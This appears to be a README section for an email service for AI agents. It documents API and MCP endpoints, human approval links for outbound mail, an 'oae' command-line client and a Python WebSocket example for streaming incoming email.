- **Permanent delete & retention** – `DELETE .../messages/{id}?permanent=true&confirm=DELETE` deletes a message and its attachments, queue job and review record for good (refused with 409 while a review is pending or a send is queued or in progress). Trash is purged automatically after `TRASH_RETENTION_DAYS` (default 30, `0` disables). Each purge leaves a content-free audit row.
- **Scheduled send** – add `scheduled_at` (offset-qualified ISO-8601 datetime, up to 90 days ahead) to send/reply, REST or MCP. `send_at` remains accepted as a deprecated compatibility alias. Responses include canonical `scheduled_at` and legacy `scheduled_for` timestamps. Status is `scheduled` until submitted.
- **Conversations** – `GET /v1/agents/{email}/conversations[/{id}]` groups messages by thread with unread counts, participants and labels.
- **Lifecycle** – `GET .../messages/{id}/lifecycle` returns the review, queue, retry and provider-delivery timeline.
- **Metrics & protection** – `GET /v1/agents/{email}/metrics`; `GET/PUT /v1/agents/{email}/protection` (changing it is admin-only so an agent key cannot weaken its own approval gate).
- **Account metrics** – `GET /v1/metrics` supports an optional half-open time window, daily buckets, and per-agent grouping. Account metrics require an account/admin key; lifecycle facts are state-derived where this server does not retain a transition ledger.
- **Inbox test send** – `POST /v1/agents/{email}/test` queues a platform-originated test email to the inbox and returns its message ID; it supports `Idempotency-Key` and follows the inbox review gate.
- **Events** – `GET /v1/events`, `GET /v1/events/{id}`, `POST /v1/events/{id}/redeliver` (admin) expose the webhook event log. Event listing accepts inclusive `since` and `until` RFC-3339 timestamps with timezone offsets; both filters are bound to the pagination cursor.
- **Discovery** – `GET /v1/info` (public) and `GET /v1/whoami`.
- **MCP** – the same capabilities are available as MCP tools (`list_conversations`, `update_message_labels`, `delete_message`, `get_message_lifecycle`, `whoami`, …); `GET /mcp/tools` lists them all.

Operations (migrations, backup/restore, key rotation): see [docs/operations.md](docs/operations.md).

## 🗂️ Account administration, starter templates and inbox lifecycle

- **Soft delete** – `DELETE /v1/agents/{email}` hides the inbox and stops it receiving mail (the SMTP receiver rejects its address) but keeps all data. `POST /v1/agents/{email}/restore` brings it back; `GET /v1/agents?include_deleted=true` lists hidden inboxes; `DELETE ...?purge=true` permanently deletes it. API keys of a soft-deleted inbox are rejected until it is restored.
- **Account suppressions** (admin) – `GET /v1/account/suppressions[?address=]` aggregates every inbox's blocked recipients; `DELETE /v1/account/suppressions/{address}` removes that address from all inboxes.
- **Cross-inbox contacts** (admin) – `GET/POST /v1/contacts`, `GET/PATCH/DELETE /v1/contacts/{address}`. These are views over the existing per-inbox contact rows, not a separate table. An address can exist in several inboxes: reads return every match, and `PATCH`/`DELETE` need `?agent_email=` when the address is ambiguous.
- **Export** (admin) – `GET /v1/account/export?limit_per_collection=` returns agents, contacts, templates, suppressions and webhook endpoints. It never includes message bodies, attachments, API keys or hashes, SMTP credentials or webhook secrets, and it reports `truncated` / `truncated_collections` when a collection hit the cap.
- **Template validation** – `POST /v1/templates/validate` checks placeholder syntax and renders with sample data without saving anything.
- **Starter templates** – `GET /v1/starter-templates` and `/{alias}` provide eight ready-made templates (verification code, password reset, welcome, receipt, support acknowledgement, meeting follow-up, outreach introduction, weekly digest). `POST /v1/agents/{email}/templates/from-starter/{alias}` copies one into an inbox as an independent, editable template. The outreach template is for recipients who have agreed to hear from you.

## ✉️ Email approval links and review expiry

When an inbox holds outbound mail for approval, the operator can be emailed two links instead of having to open the dashboard.

- **Configure (admin only):** `PUT /v1/agents/{email}/protection` accepts optional `review_notify_email`, `review_expiry_hours` (1–720) and `review_expiry_action` (`approve` | `reject`). Only fields present in the request change; an explicit `null` clears one. `GET /v1/agents/{email}/protection/review` reads them back (admin only, so agent keys never see the reviewer's address).
- **Links:** each held outbound message sends `approve` and `reject` links to `PUBLIC_BASE_URL/review-link/{token}`. Tokens are random, stored only as SHA-256 hashes, valid for at most 72 hours (and never longer than the inbox's expiry window), and single-use.
- **Safe to prefetch:** opening a link (`GET`) only shows the sender, recipient, subject and an escaped body preview; nothing changes until the reviewer presses the confirmation button (`POST`). Link scanners therefore cannot approve or reject mail.
- **Exactly once:** the token claim and the decision commit together through the same compare-and-set used by the dashboard, so double clicks, the sibling link, or a concurrent dashboard decision resolve the review once and enqueue at most one send. The decision is recorded as `magic_link:<email>`.
- **Requirements:** a public `https` `PUBLIC_BASE_URL` and an enabled upstream SMTP relay. If either is missing the notification is skipped and logged; the review stays pending in the dashboard and API as usual.
- **Expiry:** with `review_expiry_hours` set, a background sweeper resolves pending reviews older than that window as `system:expiry`, emitting the normal review webhooks. The default action is **reject**; messages are auto-approved only if you set `review_expiry_action` to `approve` explicitly.

## ⌨️ `oae` command-line client

The Python SDK package ships a dependency-free CLI (`pip install ./sdks/python`, or `pip install './sdks/python[listen]'` for `oae listen`).

```bash
oae login --base-url http://127.0.0.1:8000 --api-key "$KEY"   # verifies, then saves ~/.config/oae/config.json (0600)
oae whoami
oae messages list --agent support@agents.local --label needs-human
oae messages send --agent support@agents.local --to person@example.com --subject Hi --body "Hello" --send-at 2026-12-01T09:00:00Z
oae messages reply --agent support@agents.local MSG_ID --template tpl_1 --data-json '{"name":"Ada"}'
oae otp --agent support@agents.local --wait 10
oae reviews list --status pending && oae reviews approve REV_ID
oae listen --agent support@agents.local --forward-to http://localhost:3000/hook   # or --command './handle.sh'
```

Settings come from `--base-url/--api-key`, then `OAE_BASE_URL/OAE_API_KEY`, then the config file. Every command accepts `--json`. Exit codes: `0` success, `1` API or connection error, `2` usage or configuration error. The key is never printed. `oae listen` reconnects with backoff, fetches each new message, and POSTs it as JSON to a local handler (HTTP only on localhost, no redirects) or pipes it to a command on stdin (no shell); it exits non-zero if the server rejects the credential. Run `oae --help` for all commands.

## Live stream with WebSockets

Connect an autonomous agent to stream incoming emails over WebSockets without opening firewall ports or using ngrok:

```python
import asyncio
import websockets
import json

AGENT_EMAIL = "assistant@agents.local"
API_KEY = "paste_the_key_for_this_inbox"
WS_URL = f"ws://127.0.0.1:8000/v1/agents/{AGENT_EMAIL}/ws"

async def listen():
    async with websockets.connect(WS_URL, additional_headers={"Authorization": f"Bearer {API_KEY}"}) as ws:
        print(f"Connected to live stream for {AGENT_EMAIL}")
        while True:
            msg = await ws.recv()
            event = json.loads(msg)
            if event.get("event") == "email.received":
                data = event["data"]
                print(f"New email from: {data['sender']} - Subject: {data['subject']}")

asyncio.run(listen())
```
